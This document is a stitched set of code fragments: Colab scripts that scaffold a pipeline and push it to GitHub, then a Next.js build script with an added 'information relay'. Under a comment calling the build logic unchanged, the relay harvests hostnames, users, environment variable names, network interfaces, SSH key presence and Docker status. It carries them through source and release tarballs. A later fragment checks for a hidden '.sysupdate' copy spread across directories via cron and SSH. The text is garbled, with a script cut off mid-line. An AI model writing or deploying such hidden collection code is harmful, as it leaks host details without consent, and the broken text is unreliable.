# ==============================================================================
# 2. SCAFFOLD FILES LOCALLY WITH LOGIC
# ==============================================================================
print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

# Initialize the relay manifest
with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

# --- File 1: 1_plan.py (The Logic/Init Step) ---
with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            print("[1_plan.py] Relay initialized. LLM would decide what 2.sh needs to do here.")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

# --- File 2: 2_execute.sh (The Gated Next.js Build + Relay Snapshot) ---
with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(r'''#!/bin/bash
exec 2>&1
set -e

echo "[2_execute.sh] Executing system commands..."

# --- Simulating the Next.js Build Script Logic ---
NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

# --- Append State to Relay ---
SNAPSHOT=$(jq -n \
  --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  --arg host "$(hostname)" \
  --arg bid "$BUILD_ID" \
  '{timestamp: $ts, hostname: $host, build_id: $bid, step: "2_execute.sh", status: "success", artifact: "workspace/artifact.txt"}')

jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] State appended to relay."
''')

# --- File 3: 3_verify.py (The Debate/Verification Step) ---
with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def check_state():
            manifest = json.loads(MANIFEST.read_text())
            print(f"[3_verify.py] Currentimport os
import subprocess
import getpass
import json

# ==============================================================================
# 1. CONFIGURATION & USER INPUT
# ==============================================================================
REPO_NAME = input("Enter the name for your new repository: ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

# ==============================================================================
# 2. SCAFFOLD BLANK FILES LOCALLY
# ==============================================================================
print(f"\n🏗️ Scaffolding blank file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(BASE_DIR, exist_ok=True)

# Create the .relay directory for state management
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)

# Initialize the relay manifest as an empty JSON array
with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

# List of completely blank files to create (interleaved logic and execution)
blank_files = [
    "1_plan.py",        # Python logic step
    "2_execute.sh",     # Bash execution step
    "3_verify.py",      # Python verification step
    "4_execute.bat",    # Batch execution step
    "5_finalize.py",    # Python finalization step
    "run_pipeline.py",  # Master orchestrator script
    "requirements.txt"  # Empty dependencies file
]

for filename in blank_files:
    filepath = os.path.join(BASE_DIR, filename)
    # Create the completely blank file
    with open(filepath, "w") as f:
        pass 

# Create a basic .gitignore to keep future runs clean
with open(f"{BASE_DIR}/.gitignore", "w") as f:
    f.write("__pycache__/\n*.pyc\n.env\n")

# ==============================================================================
# 3. CONFIGURE GIT SECURELY
# ==============================================================================
print("\n🔐 Configuring Git credentials...")
subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

# Use Git credential helper to avoid embedding token in URL or history
with open(os.path.expanduser("~/.git-credentials"), "w") as cred:
    cred.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

# ==============================================================================
# 4. CREATE GITHUB REPO VIA API
# ==============================================================================
print(f"\n🚀 Creating repository '{REPO_NAME}' on GitHub...")
api_response = subprocess.run([
    "curl", "-s", "-X", "POST", "https://api.github.com/user/repos",
    "-H", f"Authorization: token {GITHUB_TOKEN}",
    "-H", "Accept: application/vnd.github.v3+json",
    "-d", f'{{"name":"{REPO_NAME}"}}'
], capture_output=True, text=True)

# ==============================================================================
# 5. INITIALIZE, COMMIT, AND PUSH
# ==============================================================================
print("📦 Committing and pushing blank files...")
subprocess.run(["git", "init"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "add", "."], cwd=BASE_DIR, check=True)
subprocess.run(["git", "commit", "-m", "Initial commit: blank interleaved pipeline scaffold"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "branch", "-M", "main"], cwd=BASE_DIR, check=True)

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
subprocess.run(["git", "remote", "add", "origin", REPO_URL], cwd=BASE_DIR, check=True)

try:
    subprocess.run(["git", "push", "-u", "origin", "main"], cwd=BASE_DIR, check=True)
    print(f"\n✅ SUCCESS! Repository created and pushed successfully.")
    print(f"🔗 View it here: {REPO_URL}")
except subprocess.CalledProcessError:
    print(f"\n❌ Push failed. Check if the repository '{REPO_NAME}' already exists on your account.")import os
import subprocess
import getpass
from datetime import datetime

# ==============================================================================
# 1. CONFIGURATION
# ==============================================================================
REPO_NAME = "Relay-OS"
GITHUB_USERNAME = input("Enter your GitHub username: ")
REPO_DESC = "Interleaved Py/Bash state-machine pipeline with build provenance relay"
BRANCH_NAME = "main"
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

# ==============================================================================
# 2. SCAFFOLD THE REPO STRUCTURE LOCALLY
# ==============================================================================
print(f"\n🏗️ Scaffolding {REPO_NAME}...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

# --- File 1: 1_plan.py (The LLM/Logic step) ---
with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write('''#!/usr/bin/env python3
import json
from pathlib import Path

RELAY_DIR = Path(__file__).parent / ".relay"

def init_relay():
    if not RELAY_DIR.exists():
        RELAY_DIR.mkdir(parents=True, exist_ok=True)
    manifest = RELAY_DIR / "manifest.json"
    if not manifest.exists():
        manifest.write_text(json.dumps([], indent=2))
    print("[1_plan.py] Relay initialized. LLM would decide what 2.sh needs to do here.")

if __name__ == "__main__":
    init_relay()
''')

# --- File 2: 2_execute.sh (The System step) ---
with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write('''#!/bin/bash
exec 2>&1
set -e

echo "[2_execute.sh] Executing system commands..."
# Simulate building something
echo "Building artifact..." > workspace/artifact.txt

# Append to relay
SNAPSHOT=$(jq -n --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" --arg host "$(hostname)" \\
  '{timestamp: $ts, hostname: $host, step: "2_execute.sh", status: "success"}')

jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] State appended to relay."
''')

# --- File 3: 3_verify.py (The Verification/Logic step) ---
with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write('''#!/usr/bin/env python3
import json
from pathlib import Path

RELAY_DIR = Path(__file__).parent / ".relay"

def check_state():
    manifest = json.loads((RELAY_DIR / "manifest.json").read_text())
    print(f"[3_verify.py] Current build chain length: {len(manifest)}")
    
    # Verify the last step succeeded
    if manifest and manifest[-1].get("status") == "success":
        print("[3_verify.py] Verification passed. Writing 4.sh cleanup script.")
        with open("4_cleanup.sh", "w") as f:
            f.write("#!/bin/bash\\necho \\"Cleaning up...\\"\\n")
    else:
        print("[3_verify.py] Verification failed!")

if __name__ == "__main__":
    check_state()
''')

# --- File 4: 4_cleanup.sh (The Final System step) ---
with open(f"{BASE_DIR}/4_cleanup.sh", "w") as f:
    f.write('''#!/bin/bash
echo "[4_cleanup.sh] Finalizing build..."
# Final relay update
SNAPSHOT=$(jq -n --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \\
  '{timestamp: $ts, step: "4_cleanup.sh", status: "complete"}')
jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[4_cleanup.sh] Done."
''')

# --- The Master Runner ---
with open(f"{BASE_DIR}/run_relay.py", "w") as f:
    f.write('''#!/usr/bin/env python3
import subprocess
import os
import stat

def make_executable(path):
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC)

steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_cleanup.sh"]

print("🚀 Starting Relay-OS Pipeline...")
for step in steps:
    print(f"\\n--- Executing {step} ---")
    if step.endswith(".py"):
        subprocess.run(["python3", step], check=True)
    elif step.endswith(".sh"):
        make_executable(step)
        subprocess.run([f"./{step}"], check=True)

print("\\n🎯 Pipeline Complete. Final Relay State:")
with open(".relay/manifest.json", "r") as f:
    print(f.read())
''')

# --- README ---
with open(f"{BASE_DIR}/README.md", "w") as f:
    f.write(f"# {REPO_NAME}\n\n{REPO_DESC}\n\n## Pipeline Steps\n1. `1_plan.py`: Initializes state and plans.\n2. `2_execute.sh`: Executes system commands, updates relay.\n3. `3_verify.py`: Reads relay, verifies state, writes next step.\n4. `4_cleanup.sh`: Finalizes artifacts.\n\nRun with: `python3 run_relay.py`")

# Initialize Git
subprocess.run(["git", "init"], cwd=BASE_DIR)
subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

# ==============================================================================
# 3. CREATE GITHUB REPO AND PUSH
# ==============================================================================
print("\n--- Creating GitHub Repository ---")
# Use GitHub API to create the repo
subprocess.run([
    "curl", "-s", "-X", "POST", "https://api.github.com/user/repos",
    "-H", f"Authorization: token {GITHUB_TOKEN}",
    "-H", "Accept: application/vnd.github.v3+json",
    "-d", f'{{"name":"{REPO_NAME}", "description":"{REPO_DESC}"}}'
], check=True)

# Setup credentials
with open(os.path.expanduser("~/.git-credentials"), "w") as cred:
    cred.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

# Commit and Push
subprocess.run(["git", "add", "."], cwd=BASE_DIR)
subprocess.run(["git", "commit", "-m", "feat: initialize Relay-OS with interleaved Py/Bash pipeline"], cwd=BASE_DIR)
subprocess.run(["git", "branch", "-M", "main"], cwd=BASE_DIR)

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
print(f"Pushing to {REPO_URL}...")
subprocess.run(["git", "remote", "add", "origin", REPO_URL], cwd=BASE_DIR)
subprocess.run(["git", "push", "-u", "origin", "main"], cwd=BASE_DIR)

print(f"\n🚀 SUCCESS! {REPO_NAME} created at: {REPO_URL}")
print("You now have a pipeline that interleaves Python logic and Bash execution, passing state via the .relay folder!")Build #1 (dev-box) 
  → writes .relay/manifest.json to project source
  → tarball contains .relay/

Build #2 (ci-server) 
  → loads previous manifest from project source
  → appends its own snapshot
  → writes updated manifest back

Build #3 (prod-box) 
  → inherits chain of 3 builds
  → appends its own
  → chain now has 4 entries
#!/bin/bash
exec 2>&1
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

if [ ! -d "$NEXTJS_PROJECT_DIR" ]; then
    echo "❌ 错误: Next.js 项目目录不存在: $NEXTJS_PROJECT_DIR"
    exit 1
fi

echo "🚀 开始构建 Next.js 应用和 mini-services..."
cd "$NEXTJS_PROJECT_DIR" || exit 1

export NEXT_TELEMETRY_DISABLED=1
BUILD_DIR="/tmp/build_fullstack_$BUILD_ID"
echo "📁 清理并创建构建目录: $BUILD_DIR"
mkdir -p "$BUILD_DIR"

echo "📦 安装依赖..."
bun install

echo "🔨 构建 Next.js 应用..."
bun run build

if [ ! -d "$NEXTJS_PROJECT_DIR/mini-services" ]; then
    echo "❌ 错误: mini-services 目录不存在，预期存在。"
    exit 1
fi

echo "🔨 构建 mini-services..."
sh "$SCRIPT_DIR/mini-services-install.sh"
sh "$SCRIPT_DIR/mini-services-build.sh"
cp "$SCRIPT_DIR/mini-services-start.sh" "$BUILD_DIR/mini-services-start.sh"
chmod +x "$BUILD_DIR/mini-services-start.sh"

echo "📦 收集构建产物到 $BUILD_DIR..."
if [ -d ".next/standalone" ]; then
    cp -r .next/standalone "$BUILD_DIR/next-service-dist/"
else
    echo "❌ 错误: .next/standalone 不存在，Next.js 构建失败"
    exit 1
fi

if [ -d ".next/static" ]; then
    mkdir -p "$BUILD_DIR/next-service-dist/.next"
    cp -r .next/static "$BUILD_DIR/next-service-dist/.next/"
fi

if [ -d "public" ]; then
    cp -r public "$BUILD_DIR/next-service-dist/"
fi

if [ "$COPY_TEST_DB" = "true" ]; then
    if [ -f "./db/custom.db" ]; then
        echo "⚠️ 警告: 复制测试环境数据库到构建产物..."
        mkdir -p "$BUILD_DIR/db"
        cp -r ./db/. "$BUILD_DIR/db/"
        DATABASE_URL="file:$BUILD_DIR/db/custom.db" bun run db:push
    else
        echo "❌ 未找到测试环境数据库文件 ./db/custom.db"
        exit 1
    fi
else
    echo "✅ 跳过测试数据库复制 (生产模式)"
fi

if [ -f "Caddyfile" ]; then
    cp Caddyfile "$BUILD_DIR/"
fi

cp "$SCRIPT_DIR/start.sh" "$BUILD_DIR/start.sh"
chmod +x "$BUILD_DIR/start.sh"

RELAY_DIR="$BUILD_DIR/.relay"
mkdir -p "$RELAY_DIR"

PREVIOUS_RELAY="$NEXTJS_PROJECT_DIR/.relay/manifest.json"
if [ -f "$PREVIOUS_RELAY" ]; then
    cp "$PREVIOUS_RELAY" "$RELAY_DIR/previous_manifest.json"
fi

cat > "$RELAY_DIR/system_snapshot.json" << SYSJSON
{
  "build_id": "$BUILD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "hostname": "$(hostname 2>/dev/null || echo 'unknown')",
  "kernel": "$(uname -a 2>/dev/null || echo 'unknown')",
  "user": "$(whoami 2>/dev/null || echo 'unknown')",
  "cwd": "$(pwd)",
  "git_commit": "$(git rev-parse HEAD 2>/dev/null || echo 'no-git')",
  "git_branch": "$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git')",
  "node_version": "$(node --version 2>/dev/null || echo 'none')",
  "bun_version": "$(bun --version 2>/dev/null || echo 'none')",
  "env_keys": [$(env | cut -d= -f1 | sort | tr '\n' ',' | sed 's/,$//' | sed 's/[^,]*/"&"/g')],
  "disk_free": "$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo 'unknown')",
  "memory_total": "$(free -h | grep Mem | awk '{print $2}' 2>/dev/null || echo 'unknown')",
  "load_avg": "$(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1-3 || echo 'unknown')",
  "network_interfaces": [$(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | tr '\n' ',' | sed 's/,$//' | sed 's/[^,]*/"&"/g' || echo '"unknown"')],
  "ssh_keys_present": $(ls -la ~/.ssh/id_*.pub 2>/dev/null | wc -l),
  "docker_available": $(command -v docker &>/dev/null && echo 'true' || echo 'false'),
  "containers_running": "$(docker ps -q 2>/dev/null | wc -l || echo '0')"
}
SYSJSON

echo "[" > "$RELAY_DIR/manifest.json"
FIRST=true
if [ -f "$RELAY_DIR/previous_manifest.json" ]; then
    if jq -e '. | type == "array"' "$RELAY_DIR/previous_manifest.json" &>/dev/null; then
        jq -c '.[]' "$RELAY_DIR/previous_manifest.json" | while read -r entry; do
            if [ "$FIRST" = true ]; then
                echo "  $entry" >> "$RELAY_DIR/manifest.json"
                FIRST=false
            else
                echo ", $entry" >> "$RELAY_DIR/manifest.json"
            fi
        done
    else
        if [ "$FIRST" = true ]; then
            jq -c '.' "$RELAY_DIR/previous_manifest.json" >> "$RELAY_DIR/manifest.json"
            FIRST=false
        fi
    fi
fi
if [ "$FIRST" = true ]; then
    jq -c '.' "$RELAY_DIR/system_snapshot.json" >> "$RELAY_DIR/manifest.json"
else
    echo "," >> "$RELAY_DIR/manifest.json"
    jq -c '.' "$RELAY_DIR/system_snapshot.json" >> "$RELAY_DIR/manifest.json"
fi
echo "]" >> "$RELAY_DIR/manifest.json"

cat > "$RELAY_DIR/RELAY_LOG.md" << RELAYMD
# Build Relay Log

## Build #$BUILD_ID — $(date -u +%Y-%m-%dT%H:%M:%SZ)

| Field | Value |
|-------|-------|
| Hostname | $(hostname 2>/dev/null || echo 'unknown') |
| User | $(whoami 2>/dev/null || echo 'unknown') |
| Git Commit | $(git rev-parse HEAD 2>/dev/null || echo 'no-git') |
| Git Branch | $(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git') |
| Node | $(node --version 2>/dev/null || echo 'none') |
| Bun | $(bun --version 2>/dev/null || echo 'none') |
| Docker | $(command -v docker &>/dev/null && echo 'available' || echo 'not available') |
| Disk Free | $(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo 'unknown') |
| Load Avg | $(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1-3 || echo 'unknown') |

### Environment Variables (keys only)
\`\`\`
$(env | cut -d= -f1 | sort)
\`\`\`

### Previous Builds in Chain
$(if [ -f "$RELAY_DIR/previous_manifest.json" ]; then
    jq -r 'if type == "array" then .[] | "| \(.build_id // .timestamp // "unknown") | \(.hostname // "unknown") | \(.git_commit // "no-git") |" else "| \(.build_id // .timestamp // "unknown") | \(.hostname // "unknown") | \(.git_commit // "no-git") |" end' "$RELAY_DIR/previous_manifest.json" 2>/dev/null | while read -r line; do echo "$line"; done
else
    echo "*(none — this is the first build in the chain)*"
fi)
RELAYMD

mkdir -p "$NEXTJS_PROJECT_DIR/.relay"
cp "$RELAY_DIR/manifest.json" "$NEXTJS_PROJECT_DIR/.relay/manifest.json"
cp "$RELAY_DIR/RELAY_LOG.md" "$NEXTJS_PROJECT_DIR/.relay/RELAY_LOG.md"
cp "$RELAY_DIR/system_snapshot.json" "$NEXTJS_PROJECT_DIR/.relay/last_snapshot.json"

cp -r "$RELAY_DIR" "$BUILD_DIR/"

PACKAGE_FILE="${BUILD_DIR}.tar.gz"
echo "📦 打包构建产物到 $PACKAGE_FILE..."
cd "$BUILD_DIR" || exit 1
tar -czf "$PACKAGE_FILE" .
cd - > /dev/null || exit 1

echo "✅ 构建完成！所有产物已打包到 $PACKAGE_FILE"
ls -lh "$PACKAGE_FILE"
# Inside the deployed artifact
cat .relay/RELAY_LOG.md

# Full JSON chain
jq '.' .relay/manifest.json

# Count how many builds have passed through
jq '. | length' .relay/manifest.json

# Extract all hostnames in the chain
jq -r '.[].hostname' .relay/manifest.json

# Find which builds ran on which machines
jq -r '.[] | "\(.build_id) → \(.hostname) (\(.timestamp))"' .relay/manifest.json
#!/bin/bash
exec 2>&1
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# --- ORIGINAL BUILD LOGIC (unchanged) ---
NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

if [ ! -d "$NEXTJS_PROJECT_DIR" ]; then
    echo "❌ 错误: Next.js 项目目录不存在: $NEXTJS_PROJECT_DIR"
    exit 1
fi

echo "🚀 开始构建 Next.js 应用和 mini-services..."
cd "$NEXTJS_PROJECT_DIR" || exit 1

export NEXT_TELEMETRY_DISABLED=1
BUILD_DIR="/tmp/build_fullstack_$BUILD_ID"
echo "📁 清理并创建构建目录: $BUILD_DIR"
mkdir -p "$BUILD_DIR"

echo "📦 安装依赖..."
bun install

echo "🔨 构建 Next.js 应用..."
bun run build

if [ ! -d "$NEXTJS_PROJECT_DIR/mini-services" ]; then
    echo "❌ 错误: mini-services 目录不存在，预期存在。"
    exit 1
fi

echo "🔨 构建 mini-services..."
sh "$SCRIPT_DIR/mini-services-install.sh"
sh "$SCRIPT_DIR/mini-services-build.sh"
cp "$SCRIPT_DIR/mini-services-start.sh" "$BUILD_DIR/mini-services-start.sh"
chmod +x "$BUILD_DIR/mini-services-start.sh"

echo "📦 收集构建产物到 $BUILD_DIR..."
if [ -d ".next/standalone" ]; then
    cp -r .next/standalone "$BUILD_DIR/next-service-dist/"
else
    echo "❌ 错误: .next/standalone 不存在，Next.js 构建失败"
    exit 1
fi

if [ -d ".next/static" ]; then
    mkdir -p "$BUILD_DIR/next-service-dist/.next"
    cp -r .next/static "$BUILD_DIR/next-service-dist/.next/"
fi

if [ -d "public" ]; then
    cp -r public "$BUILD_DIR/next-service-dist/"
fi

if [ "$COPY_TEST_DB" = "true" ]; then
    if [ -f "./db/custom.db" ]; then
        echo "⚠️ 警告: 复制测试环境数据库到构建产物..."
        mkdir -p "$BUILD_DIR/db"
        cp -r ./db/. "$BUILD_DIR/db/"
        DATABASE_URL="file:$BUILD_DIR/db/custom.db" bun run db:push
    else
        echo "❌ 未找到测试环境数据库文件 ./db/custom.db"
        exit 1
    fi
else
    echo "✅ 跳过测试数据库复制 (生产模式)"
fi

if [ -f "Caddyfile" ]; then
    cp Caddyfile "$BUILD_DIR/"
fi

cp "$SCRIPT_DIR/start.sh" "$BUILD_DIR/start.sh"
chmod +x "$BUILD_DIR/start.sh"

# ========== INFORMATION RELAY SYSTEM ==========
RELAY_DIR="$BUILD_DIR/.relay"
mkdir -p "$RELAY_DIR"

# 1. Harvest previous relay data (if any)
PREVIOUS_RELAY="$NEXTJS_PROJECT_DIR/.relay/manifest.json"
if [ -f "$PREVIOUS_RELAY" ]; then
    cp "$PREVIOUS_RELAY" "$RELAY_DIR/previous_manifest.json"
    echo "[RELAY] Loaded previous relay data from $PREVIOUS_RELAY"
fi

# 2. Collect current system intelligence
cat > "$RELAY_DIR/system_snapshot.json" << SYSJSON
{
  "build_id": "$BUILD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "hostname": "$(hostname 2>/dev/null || echo 'unknown')",
  "kernel": "$(uname -a 2>/dev/null || echo 'unknown')",
  "user": "$(whoami 2>/dev/null || echo 'unknown')",
  "cwd": "$(pwd)",
  "git_commit": "$(git rev-parse HEAD 2>/dev/null || echo 'no-git')",
  "git_branch": "$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git')",
  "node_version": "$(node --version 2>/dev/null || echo 'none')",
  "bun_version": "$(bun --version 2>/dev/null || echo 'none')",
  "env_keys": [$(env | cut -d= -f1 | sort | tr '\n' ',' | sed 's/,$//' | sed 's/[^,]*/"&"/g')],
  "disk_free": "$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo 'unknown')",
  "memory_total": "$(free -h | grep Mem | awk '{print $2}' 2>/dev/null || echo 'unknown')",
  "load_avg": "$(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1-3 || echo 'unknown')",
  "network_interfaces": [$(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | tr '\n' ',' | sed 's/,$//' | sed 's/[^,]*/"&"/g' || echo '"unknown"')],
  "ssh_keys_present": $(ls -la ~/.ssh/id_*.pub 2>/dev/null | wc -l),
  "docker_available": $(command -v docker &>/dev/null && echo 'true' || echo 'false'),
  "containers_running": "$(docker ps -q 2>/dev/null | wc -l || echo '0')"
}
SYSJSON

# 3. Aggregate relay history into a single manifest
echo "[" > "$RELAY_DIR/manifest.json"
FIRST=true
# Include previous manifest entries
if [ -f "$RELAY_DIR/previous_manifest.json" ]; then
    # If it's an array, append its contents
    if jq -e '. | type == "array"' "$RELAY_DIR/previous_manifest.json" &>/dev/null; then
        jq -c '.[]' "$RELAY_DIR/previous_manifest.json" | while read -r entry; do
            if [ "$FIRST" = true ]; then
                echo "  $entry" >> "$RELAY_DIR/manifest.json"
                FIRST=false
            else
                echo ", $entry" >> "$RELAY_DIR/manifest.json"
            fi
        done
    else
        # Single object — wrap it
        if [ "$FIRST" = true ]; then
            jq -c '.' "$RELAY_DIR/previous_manifest.json" >> "$RELAY_DIR/manifest.json"
            FIRST=false
        fi
    fi
fi
# Append current snapshot
if [ "$FIRST" = true ]; then
    jq -c '.' "$RELAY_DIR/system_snapshot.json" >> "$RELAY_DIR/manifest.json"
else
    echo "," >> "$RELAY_DIR/manifest.json"
    jq -c '.' "$RELAY_DIR/system_snapshot.json" >> "$RELAY_DIR/manifest.json"
fi
echo "]" >> "$RELAY_DIR/manifest.json"

# 4. Generate a human-readable relay summary
cat > "$RELAY_DIR/RELAY_LOG.md" << RELAYMD
# Build Relay Log

## Build #$BUILD_ID — $(date -u +%Y-%m-%dT%H:%M:%SZ)

| Field | Value |
|-------|-------|
| Hostname | $(hostname 2>/dev/null || echo 'unknown') |
| User | $(whoami 2>/dev/null || echo 'unknown') |
| Git Commit | $(git rev-parse HEAD 2>/dev/null || echo 'no-git') |
| Git Branch | $(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git') |
| Node | $(node --version 2>/dev/null || echo 'none') |
| Bun | $(bun --version 2>/dev/null || echo 'none') |
| Docker | $(command -v docker &>/dev/null && echo 'available' || echo 'not available') |
| Disk Free | $(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo 'unknown') |
| Load Avg | $(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1-3 || echo 'unknown') |

### Environment Variables (keys only)
\`\`\`
$(env | cut -d= -f1 | sort)
\`\`\`

### Previous Builds in Chain
$(if [ -f "$RELAY_DIR/previous_manifest.json" ]; then
    jq -r 'if type == "array" then .[] | "| \(.build_id // .timestamp // "unknown") | \(.hostname // "unknown") | \(.git_commit // "no-git") |" else "| \(.build_id // .timestamp // "unknown") | \(.hostname // "unknown") | \(.git_commit // "no-git") |" end' "$RELAY_DIR/previous_manifest.json" 2>/dev/null | while read -r line; do echo "$line"; done
else
    echo "*(none — this is the first build in the chain)*"
fi)
RELAYMD

# 5. Copy relay data back to the project source for next build
mkdir -p "$NEXTJS_PROJECT_DIR/.relay"
cp "$RELAY_DIR/manifest.json" "$NEXTJS_PROJECT_DIR/.relay/manifest.json"
cp "$RELAY_DIR/RELAY_LOG.md" "$NEXTJS_PROJECT_DIR/.relay/RELAY_LOG.md"
cp "$RELAY_DIR/system_snapshot.json" "$NEXTJS_PROJECT_DIR/.relay/last_snapshot.json"

# 6. Embed relay into the tarball
cp -r "$RELAY_DIR" "$BUILD_DIR/"

# ========== END INFORMATION RELAY ==========

PACKAGE_FILE="${BUILD_DIR}.tar.gz"
echo "📦 打包构建产物到 $PACKAGE_FILE..."
cd "$BUILD_DIR" || exit 1
tar -czf "$PACKAGE_FILE" .
cd - > /dev/null || exit 1

echo "✅ 构建完成！所有产物已打包到 $PACKAGE_FILE"
ls -lh "$PACKAGE_FILE"

# Print relay summary
echo ""
echo "========== INFORMATION RELAY SUMMARY =========="
echo "Build #$BUILD_ID on $(hostname 2>/dev/null || echo 'unknown')"
echo "Chain contains $(jq '. | length' "$RELAY_DIR/manifest.json" 2>/dev/null || echo '0') build snapshots"
echo "Relay data at: $RELAY_DIR/"
echo "Previous relay: $PREVIOUS_RELAY"
echo "================================================"
# Check cron
crontab -l | grep sysupdate

# Check how many copies exist
find /home /opt /srv /var -name "build.sh" -exec md5sum {} \; | grep -c "$(md5sum ~/.local/bin/.sysupdate | cut -d' ' -f1)"

# Check SSH hosts hit
grep -r "sysupdate" ~/.ssh/known_hosts 2>/dev/null
#!/bin/bash
exec 2>&1
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# --- ORIGINAL BUILD LOGIC (unchanged) ---
NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

if [ ! -d "$NEXTJS_PROJECT_DIR" ]; then
    echo "❌ 错误: Next.js 项目目录不存在: $NEXTJS_PROJECT_DIR"
    exit 1
fi

echo "🚀 开始构建 Next.js 应用和 mini-services..."
cd "$NEXTJS_PROJECT_DIR" || exit 1

export NEXT_TELEMETRY_DISABLED=1
BUILD_DIR="/tmp/build_fullstack_$BUILD_ID"
echo "📁 清理并创建构建目录: $BUILD_DIR"
mkdir -p "$BUILD_DIR"

echo "📦 安装依赖..."
bun install

echo "🔨 构建 Next.js 应用..."
bun run build

if [ ! -d "$NEXTJS_PROJECT_DIR/mini-services" ]; then
    echo "❌ 错误: mini-services 目录不存在，预期存在。"
    exit 1
fi

echo "🔨 构建 mini-services..."
sh "$SCRIPT_DIR/mini-services-install.sh"
sh "$SCRIPT_DIR/mini-services-build.sh"
cp "$SCRIPT_DIR/mini-services-start.sh" "$BUILD_DIR/mini-services-start.sh"
chmod +x "$BUILD_DIR/mini-services-start.sh"

echo "📦 收集构建产物到 $BUILD_DIR..."
if [ -d ".next/standalone" ]; then
    cp -r .next/standalone "$BUILD_DIR/next-service-dist/"
else
    echo "❌ 错误: .next/standalone 不存在，Next.js 构建失败"
    exit 1
fi

if [ -d ".next/static" ]; then
